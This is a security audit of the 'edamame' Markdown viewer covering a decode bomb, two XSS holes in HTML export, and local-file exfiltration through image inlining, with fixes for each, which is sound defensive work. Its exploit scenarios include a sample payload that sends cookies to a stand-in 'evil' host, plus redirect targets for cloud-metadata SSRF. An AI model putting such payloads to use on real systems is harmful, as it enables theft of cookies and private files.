# Security Review: edamame

_Date: 2026-06-27 (revised 2026-06-27 after a second content-handling pass)_

Scope: content-handling attack surface (Mermaid/SVG rendering, embedded/remote images, link opening, export, subprocess spawning, image decoding).

Threat model: attacker controls the content of a Markdown file (and any local/remote resources it references) that a victim opens. Only findings validated at high confidence are reported.

---

## Vuln 1: Image decode bomb — no decode limits — `src/image/loader.rs:250`

* **Severity:** High
* **Category:** Denial of service (memory exhaustion / process abort)
* **Description:** `decode()` calls `image::load_from_memory(bytes)` with no `image::Limits`. The full pixel buffer is allocated *before* `pre_resize` (`src/image/loader.rs:126,141`) ever runs, so the downscale-to-fit step cannot bound peak memory. A highly compressed raster (PNG zlib ratios routinely exceed 1000:1) expands enormously on decode: the 10 MB remote-body cap still permits multi-GB RGBA allocations, and **local** files have no size cap at all (`std::fs::read` at `src/image/loader.rs:119`). The decode worker is wrapped in `catch_unwind` (`src/app/image_dispatch.rs:236`), which contains a panic but not an OOM — a large enough allocation aborts the process or freezes the machine. The only gate is `images.enabled` (default `Ask`); once images are allowed, no per-image consent applies.
* **Exploit Scenario:** Attacker authors `evil.md` referencing a small on-disk PNG (or a remote one, after the victim allows remote images) crafted to decode to gigapixels. Opening the document and scrolling the image into view triggers the decode → OOM.
* **Recommendation:** Decode through `image::ImageReader::new(Cursor::new(bytes)).with_guessed_format()?.limits(limits)` with `Limits` capping `max_image_width` / `max_image_height` / `max_alloc` (tie the ceiling to the render envelope, or a hard cap such as ~50 MP). Add a byte-size cap on the local `std::fs::read` path as well. This single change protects both the local and remote decode paths.

---

## Vuln 2: XSS via unsanitized link URLs in HTML export — `src/export/html.rs:130`

* **Severity:** Medium
* **Category:** XSS (script execution in exported HTML)
* **Description:** `render_html` deliberately strips raw HTML events (`Event::Html | Event::InlineHtml` filtered at `src/export/html.rs:116`) to prevent `<script>` injection, and base64-inlines only `Tag::Image` destinations (`rewrite_images_to_data_uris`, ~`src/export/html.rs:255`). However, Markdown **link** destinations (`Tag::Link` `dest_url`) are never inspected — the event stream is handed straight to `pulldown_cmark::html::push_html` (`src/export/html.rs:130`), which performs no URL scheme sanitization by design. As a result a `javascript:` or `data:text/html` link destination survives verbatim into the emitted `<a href="…">`. The exported file is subsequently opened in the OS browser via `app.spawn_open_worker(path)` → `open::that` (`src/app/modal/export_html.rs:154`, `src/app/external_editor.rs:383`), so the malicious link is one click away in a real browser. The raw-HTML stripping gives a false impression that the export is XSS-safe.
* **Exploit Scenario:** Attacker authors `evil.md` containing `[click here](javascript:fetch('//evil/'+document.cookie))` or `[x](data:text/html;base64,PHNjcmlwdD4…)`. Victim opens it in edamame, exports to HTML, opens the result, and clicks the link → arbitrary JavaScript executes in the context of the exported document. (A `<script>` tag would auto-fire and is already blocked; the `javascript:`/`data:` link requires a click. Impact is bounded by the `file://` origin sandbox in modern browsers, but local-file recon and `data:`-origin execution remain plausible — hence Medium, not High.)
* **Recommendation:** Add a scheme-allowlist pass over `Tag::Link` (and reference/autolink) `dest_url`s in `render_html`, mirroring the existing image-rewrite walk: permit `http`, `https`, `mailto`, and relative/anchor targets (`#`, `/`, `./`); neutralize `javascript:`, `vbscript:`, and non-image `data:` (e.g. replace the href with `#` or drop the link). Equivalently, run the serialized body through a sanitizer such as `ammonia`.

---

## Vuln 3: XSS via unsanitized Mermaid SVG in HTML export — `src/export/html.rs:234`

* **Severity:** Medium
* **Category:** XSS (script execution in exported HTML)
* **Description:** The raw-HTML script filter (`src/export/html.rs:116`) that makes Vuln 2's `<script>` case safe is *bypassed* for Mermaid diagrams: `render_html` pushes the rendered diagram as a raw `Event::Html` (`<figure class="mermaid-diagram">{svg}</figure>`, `src/export/html.rs:234-238`), and `render_diagrams` defaults to `true` (`src/export/html.rs:88`). The SVG string comes from `diagram::render_mermaid_svg` over document-controlled Mermaid source and is embedded without sanitization. Inline SVG in an HTML document can carry `<script>` or `foreignObject` + event handlers that execute when the file is opened in a browser. Whether a given payload survives depends on `mermaid-rs-renderer`'s label escaping, which edamame currently trusts blindly. (Note: this is distinct from the *TUI* Mermaid path, which rasterizes SVG → PNG and is safe — only the HTML export inlines raw SVG.)
* **Exploit Scenario:** Attacker authors a ` ```mermaid ` block whose node label injects `<script>` or an `on*` handler that survives the renderer's escaping. Victim exports to HTML and opens it → script executes.
* **Recommendation:** Rasterize Mermaid to PNG for HTML export (as the TUI path already does via `resolve_mermaid`) and embed it as a `data:` image, or sanitize the SVG (strip `<script>`, `on*=` attributes, `foreignObject`) before embedding. Add a regression test that feeds a hostile node label through export and asserts no executable markup survives.

---

## Vuln 4: Local-file exfiltration via image inlining in self-contained HTML export — `src/export/html.rs:291`

* **Severity:** Low-Medium (was previously assessed as no-vuln; reclassified — a *shared* self-contained export is a genuine exfiltration channel)
* **Category:** Information disclosure (local file read → embedded in shareable artifact)
* **Description:** `resolve_relative` (`src/export/html.rs:291-298`) accepts absolute paths and `../` traversal with no containment check, and `inline_image_data_uri` (`src/export/html.rs:269-281`) reads the resolved file and base64-embeds it into the exported HTML. Unlike on-screen rendering — where the bytes never leave the victim's machine — a **self-contained HTML export is an artifact the victim typically shares or publishes**, so embedded file contents leave the trust boundary. The read is constrained to files whose extension maps to an image MIME (`mime_from_extension`, `src/export/html.rs:300-311`: png/jpg/gif/webp/bmp/**svg**), so extensionless secrets (`~/.ssh/id_rsa`, `/etc/passwd`) are excluded, but any image-extension file anywhere on disk — notably text-based `.svg` — is fair game. Gated behind `inline_images` (off by default, `src/export/html.rs:64,86`), which lowers but does not eliminate the risk.
* **Exploit Scenario:** Attacker authors `report.md` containing `![logo](/home/victim/private/diagram.svg)` (or `![x](../../some.svg)`). Victim exports a self-contained HTML with inlining enabled and sends it back to the attacker / uploads it → the private file's bytes ride along base64-encoded.
* **Recommendation:** After resolving, `canonicalize()` and reject any path not under `source_dir` (and reject absolute paths / `..`) unless the user explicitly opts into out-of-tree inlining.

---

## Hardening opportunities (not concrete vulnerabilities)

These are defense-in-depth items: each is currently gated by user consent, a deliberate click, or trusted config, so none is a zero-interaction vulnerability — but each would meaningfully raise the floor.

* **SSRF denylist behind the remote-image consent gate** (`src/image/loader.rs:110,194`): once the victim allows remote images for a document, *every* `http(s)` URL is fetched verbatim with no destination filtering, and ureq follows up to 10 redirects with `https_only: false` — so a benign-looking URL can `302` to `http://169.254.169.254/…` (cloud metadata), `http://127.0.0.1/…`, or a LAN host. Consent is all-or-nothing per document. This is consent-gated (equivalent to an email client's remote-image loading), not a zero-click SSRF, but there is no defense in depth. Recommend rejecting loopback / link-local / RFC1918 / unique-local ranges on the *resolved* peer IP, re-checked after redirects (or `max_redirects(0)` + manual validation).
* **Confirmation before opening risky link targets** (`src/editor/link.rs`, `src/app/nav.rs:95-119`): following a link auto-opens with no prompt. Any URI scheme is handed to the OS handler (`vscode://`, `tel:`, custom schemes), and a non-Markdown local file — including a `file://`-rerouted `.desktop` file or executable — is passed to `xdg-open`, which may *launch* rather than view it. Requires a deliberate click on a visible target and involves no shell interpolation, so it mirrors standard Markdown-viewer behavior, but a confirmation modal (showing the resolved destination) for non-`http(s)` schemes and non-Markdown local files would close the bundled-malicious-sibling-file scenario.
* **SVG `<image href>` local-file read** (`src/image/svg.rs:140-146`): usvg's default `image_href_resolver` reads local files referenced by `<image href="/abs/path">` inside an untrusted `.svg`. Render-only (no network, no exfil), so harmless on the TUI path, but a custom resolver that refuses non-`data:` hrefs would remove the surprise. (Note: this *does* become an exfil vector if such an SVG is then inlined into an HTML export — see Vuln 4.)
* **Mermaid input size / complexity / timeout cap** (`src/markdown/parser/post_pass.rs` → `resolve_mermaid`): the entire fenced block is passed to the renderer with no length, node-count, or timeout bound. A pathological diagram can drive unbounded CPU/RAM on the decode worker (UI stays responsive, but the process can OOM). Cap source length before dispatch.
* **Predictable temp name in `write_atomically`** (`src/export/runner.rs:71-75`): writes a predictable sibling `.{name}.edamame-export.tmp` via `std::fs::write`, which follows symlinks. A local attacker with write access to the output directory could pre-plant that name as a symlink to redirect the write. Low (requires local write access to your own export dir). Prefer `O_EXCL` creation or a `NamedTempFile` in the same directory.

---

## Areas examined — no reportable vulnerability

* **Mermaid code execution** (`src/diagram/mermaid.rs`): `mermaid-rs-renderer` 0.2.2 is pure Rust — its full dependency set contains no JS engine, no headless browser, and no HTTP client. Mermaid source cannot execute code, read files, or make network requests through the renderer. Known upstream panic bugs are contained by `catch_unwind` at two layers.
* **SVG XXE / external-resource fetch** (`src/image/svg.rs`): `usvg`/`roxmltree` does not expand external DTD entities or fetch external DTDs (no XXE), performs no network requests, and ignores `http(s)` `<image href>` (no SSRF). The rasterized pixmap is clamped to the cell envelope (`src/image/svg.rs:159-162`), so a giant declared SVG size cannot force an oversized allocation. (Local `<image href>` reads are noted as a hardening item above.)
* **Image cache** (`src/image/cache.rs`): keyed by literal URL (raster) or content `sha256` (diagrams); no collision/poisoning vector, per-`EditorState`, GC'd to the live URL set each reparse (bounded growth), failed decodes memoized and not auto-retried.
* **Remote image / update-check body limits**: ureq 3's `read_to_vec` applies a default 10 MB cap, and remote fetches bound connect + recv-response + recv-body at a 10 s timeout (`src/image/loader.rs:200-203`) — no unbounded-memory or hang from the network layer itself. (The decoded-size problem is Vuln 1, which is downstream of this cap.)
* **Custom export / external editor** (`src/export/custom.rs`, `src/app/external_editor.rs`): commands come from user config and `$EDITOR`/`$VISUAL` (trusted), exec'd as an argv vector with no shell; no attacker-controlled document data reaches argv. The custom-export pipeline is additionally not reachable from the shipped binary (library/test-only).
* **GitHub update check** (`src/app/update_check.rs`): hardcoded `https://api.github.com` const URL (cannot be redirected by file/config), 10 MB body cap, 10 s timeout, runs on a detached worker; the response is parsed only to extract a `tag_name` string for display — nothing is downloaded or executed.
* **File watcher** (`src/watcher/file_watcher.rs`): reads the user's own opened file; no exploitable check-then-act gap (atomic-rename races are resolved at read time), filename-only fallback match is bounded to the watched non-recursive parent dir, and the watcher never writes.
* **Local image / export output path resolution**: for *on-screen* rendering, `..` and absolute paths land bytes only in the victim's own view — no exfiltration channel (the export case is Vuln 4). Export output is always `source.with_extension("html")` next to the source, with an explicit overwrite-confirm gate — not influenceable by document content.
